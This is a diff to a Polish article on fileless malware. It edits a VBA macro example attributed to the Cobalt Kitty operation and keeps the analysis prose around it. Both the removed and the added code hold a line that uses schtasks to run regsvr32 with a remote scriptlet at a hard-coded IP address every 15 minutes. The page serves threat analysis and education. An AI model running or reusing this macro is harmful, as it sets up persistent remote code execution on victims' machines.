@@ -163,82 +163,31 @@ Fileless malware, czyli złośliwe oprogramowanie bezplikowe, stanowi poważne w
 
 ##### **Przykład Implementacji `CreateProcessA` w Ataku Fileless Malware (Cobalt Kitty)**
 
-```vb
-Option Explicit
-
-' Deklaracja funkcji CreateProcessA z WinAPI
-Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
-    ByVal lpApplicationName As String, _
-    ByVal lpCommandLine As String, _
-    ByVal lpProcessAttributes As LongPtr, _
-    ByVal lpThreadAttributes As LongPtr, _
-    ByVal bInheritHandles As Long, _
-    ByVal dwCreationFlags As Long, _
-    ByVal lpEnvironment As LongPtr, _
-    ByVal lpCurrentDirectory As String, _
-    lpStartupInfo As STARTUPINFO, _
-    lpProcessInformation As PROCESS_INFORMATION) As Long
-
-' Struktura STARTUPINFO
-Private Type STARTUPINFO
-    cb As Long
-    lpReserved As LongPtr
-    lpDesktop As LongPtr
-    lpTitle As LongPtr
-    dwX As Long
-    dwY As Long
-    dwXSize As Long
-    dwYSize As Long
-    dwXCountChars As Long
-    dwYCountChars As Long
-    dwFillAttribute As Long
-    dwFlags As Long
-    wShowWindow As Integer
-    cbReserved2 As Integer
-    lpReserved2 As LongPtr
-    hStdInput As LongPtr
-    hStdOutput As LongPtr
-    hStdError As LongPtr
-End Type
-
-' Struktura PROCESS_INFORMATION
-Private Type PROCESS_INFORMATION
-    hProcess As LongPtr
-    hThread As LongPtr
-    dwProcessId As Long
-    dwThreadId As Long
-End Type
-
-' Funkcja do usunięcia uchwytu procesu
-Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
-
-Sub CreateScheduledTaskWithCreateProcessA()
-    Dim sCMDLine As String
-    Dim si As STARTUPINFO
-    Dim pi As PROCESS_INFORMATION
-    Dim lSuccess As Long
+   ```vb
+   Option Explicit
     
-    ' Definicja polecenia CMD do utworzenia zadania
-    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /f"
-    
-    ' Inicjalizacja struktury STARTUPINFO
-    si.cb = Len(si)
-    
-    ' Uruchomienie polecenia za pomocą CreateProcessA
-    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
-    
-    ' Sprawdzenie czy zadanie zostało utworzone pomyślnie
-    If lSuccess = 0 Then
-        MsgBox "Nie udało się utworzyć zadania", vbCritical
-    Else
-        MsgBox "Zadanie zostało utworzone pomyślnie", vbInformation
-    End If
+   …
 
-    ' Zamknięcie uchwytów procesu i wątku
-    If pi.hProcess <> 0 Then CloseHandle pi.hProcess
-    If pi.hThread <> 0 Then CloseHandle pi.hThread
-End Sub
-```
+   Sub CreateScheduledTaskWithCreateProcessA()
+       Dim sCMDLine As String
+       Dim si As STARTUPINFO
+       Dim pi As PROCESS_INFORMATION
+       Dim lSuccess As Long
+       
+       ' Definicja polecenia CMD do utworzenia zadania
+       sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /f"
+       
+       ' Inicjalizacja struktury STARTUPINFO
+       si.cb = Len(si)
+       
+       ' Uruchomienie polecenia za pomocą CreateProcessA
+       lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
+
+   …
+   
+   End Sub
+   ```
+   [Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty](operacja-cobalt-kitty.md#rozszerzona-analiza-kodów-makr-użytych-w-operacji-cobalt-kitty)
 
 **Analiza Przykładu:**
 
@@ -376,8 +325,9 @@ End Sub
    
    End Sub
    ```
-    [Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty](operacja-cobalt-kitty.md#rozszerzona-analiza-kodów-makr-użytych-w-operacji-cobalt-kitty)
-   **Opis Przykładu:**
+   [Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty](operacja-cobalt-kitty.md#rozszerzona-analiza-kodów-makr-użytych-w-operacji-cobalt-kitty)
+   
+2. **Opis Przykładu:**
 
    - **Funkcja `CreateProcessA`:** Używana do tworzenia nowego procesu, w tym przypadku `schtasks`, który tworzy harmonogramowane zadanie uruchamiające `regsvr32.exe` z określonymi parametrami.
    
